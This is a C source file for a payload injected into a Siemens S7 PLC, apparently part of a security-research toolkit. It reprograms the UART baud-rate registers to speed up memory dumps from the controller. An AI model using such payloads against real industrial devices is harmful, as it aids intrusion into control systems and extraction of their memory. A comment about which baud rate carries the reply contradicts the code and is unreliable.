/**
 * @file set_uart_speed.c
 * @brief UART speed reconfiguration payload for Siemens S7 PLC
 * 
 * This payload reconfigures the PL011 UART baud rate to a higher speed
 * to improve memory dump transfer rates. It calculates and sets the
 * appropriate baud rate divisors based on the requested speed.
 * 
 * PL011 UART Baud Rate Configuration:
 * BaudRateDivisor = UARTCLK / (16 × BaudRate)
 * UARTIBRD = integer(BaudRateDivisor)
 * UARTFBRD = integer((BaudRateDivisor - UARTIBRD) × 64 + 0.5)
 */

#include <stdbool.h>
#include <stdint.h>

#include "../lib/print.h"
#include "../lib/read.h"

// UART PL011 Register Offsets (word aligned)
#define UART_BASE_ADDR      0xFFFB8000
#define UART_DR             0   // Data Register
#define UART_RSR_ECR        1   // Receive Status / Error Clear
#define UART_FR             6   // Flag Register
#define UART_IBRD           9   // Integer Baud Rate Divisor (offset 0x24 / 4)
#define UART_FBRD           10  // Fractional Baud Rate Divisor (offset 0x28 / 4)
#define UART_LCRH           11  // Line Control Register (offset 0x2C / 4)
#define UART_CR             12  // Control Register (offset 0x30 / 4)

// UART Control Register Bits
#define UART_CR_UARTEN      (1 << 0)  // UART Enable
#define UART_CR_TXE         (1 << 8)  // Transmit Enable
#define UART_CR_RXE         (1 << 9)  // Receive Enable

// UART Line Control Register Bits
#define UART_LCRH_FEN       (1 << 4)  // Enable FIFOs
#define UART_LCRH_WLEN_8BIT (3 << 5)  // 8 bits

// UART Flag Register Bits
#define UART_FR_TXFE        (1 << 7)  // Transmit FIFO Empty
#define UART_FR_BUSY        (1 << 3)  // UART Busy

// Watchdog register
#define WATCHDOG_EXCITE     do {*((volatile uint32_t *)0xFFFBB120) = 0x967EA5C3;} while (0)

// UART clock frequency (assumed based on common ARM implementations)
// This value may need adjustment based on actual PLC hardware
#define UART_CLK_HZ         14745600  // Common UART clock frequency

// Baud rate definitions
#define BAUD_38400          38400
#define BAUD_115200         115200
#define BAUD_230400         230400
#define BAUD_460800         460800

volatile uint32_t* uart_base = (volatile uint32_t*)UART_BASE_ADDR;

char greeting[] = "UART_SPEED_OK\0";
char error_msg[] = "UART_SPEED_ERR\0";

/**
 * @brief Calculate baud rate divisors for PL011 UART
 * @param baud_rate Target baud rate
 * @param ibrd Pointer to store integer divisor
 * @param fbrd Pointer to store fractional divisor
 */
void calculate_baud_divisors(uint32_t baud_rate, uint32_t *ibrd, uint32_t *fbrd) {
    // BaudRateDivisor = UARTCLK / (16 × BaudRate)
    uint32_t brd_x16 = UART_CLK_HZ / baud_rate;
    *ibrd = brd_x16 >> 4;  // Divide by 16 to get integer part
    
    // Calculate fractional part: ((BRD - IBRD) × 64 + 0.5)
    // We multiply by 1024 (64*16) then divide by 16 for better precision
    uint32_t remainder = brd_x16 & 0xF;
    *fbrd = ((remainder * 64) + 8) >> 4;  // +8 for rounding (0.5 * 16)
}

/**
 * @brief Wait for UART to finish transmitting
 */
void uart_wait_tx_complete(void) {
    while (uart_base[UART_FR] & UART_FR_BUSY) {
        WATCHDOG_EXCITE;
    }
    while (!(uart_base[UART_FR] & UART_FR_TXFE)) {
        WATCHDOG_EXCITE;
    }
}

/**
 * @brief Reconfigure UART baud rate
 * @param baud_rate Target baud rate
 * @return 0 on success, -1 on error
 */
int reconfigure_uart_speed(uint32_t baud_rate) {
    uint32_t ibrd, fbrd;
    uint32_t cr_saved;
    
    // Validate baud rate
    if (baud_rate == 0 || baud_rate > BAUD_460800) {
        return -1;
    }
    
    // Calculate divisors
    calculate_baud_divisors(baud_rate, &ibrd, &fbrd);
    
    // Validate divisors
    if (ibrd == 0 || ibrd > 0xFFFF) {
        return -1;
    }
    if (fbrd > 0x3F) {
        fbrd = 0x3F;  // Cap at maximum value
    }
    
    // Wait for current transmission to complete
    uart_wait_tx_complete();
    
    // Save current control register
    cr_saved = uart_base[UART_CR];
    
    // Disable UART
    uart_base[UART_CR] = 0;
    
    // Wait for UART to become idle
    while (uart_base[UART_FR] & UART_FR_BUSY) {
        WATCHDOG_EXCITE;
    }
    
    // Flush FIFOs by disabling them
    uart_base[UART_LCRH] = 0;
    
    // Set baud rate divisors
    uart_base[UART_IBRD] = ibrd;
    uart_base[UART_FBRD] = fbrd;
    
    // Configure line control: 8N1, FIFOs enabled
    uart_base[UART_LCRH] = UART_LCRH_WLEN_8BIT | UART_LCRH_FEN;
    
    // Re-enable UART with same settings
    uart_base[UART_CR] = cr_saved | UART_CR_UARTEN | UART_CR_TXE | UART_CR_RXE;
    
    return 0;
}

int doit(unsigned char *, unsigned char *) __attribute__((noinline));

/**
 * @brief Entry point for the UART speed reconfiguration payload
 * @param read_buf Buffer containing baud rate parameter from host
 * @param write_buf Buffer for writing response data
 * @return 0 on success
 */
int _start(unsigned char *read_buf, unsigned char *write_buf) {
    __asm__("stmfd sp!, {r2-r12, lr}");
    __asm__("adr r9, _start");
    
    int res = doit(read_buf, write_buf);

    __asm("ldmfd sp!, {r2-r12, lr}");
    return res;
}

/**
 * @brief Main UART speed configuration function
 * @param read_buf Buffer containing baud rate (4 bytes at offset 4)
 * @param write_buf Buffer for response (unused)
 * @return 0 on success
 */
int doit(uint8_t *read_buf, unsigned char *write_buf) {
    // Extract baud rate from read_buf (at offset 4)
    uint32_t baud_rate = *((uint32_t *)(read_buf + 4));
    
    // Reconfigure UART speed
    int result = reconfigure_uart_speed(baud_rate);
    
    if (result == 0) {
        // Success - send confirmation
        // Note: This will be sent at the OLD baud rate, then the host
        // must switch to the new baud rate
        UART_protocol_send_single(greeting, sizeof(greeting));
    } else {
        // Error - send error message
        UART_protocol_send_single(error_msg, sizeof(error_msg));
    }
    
    write_buf[0] = (result == 0) ? 0 : 1;
    return result;
}
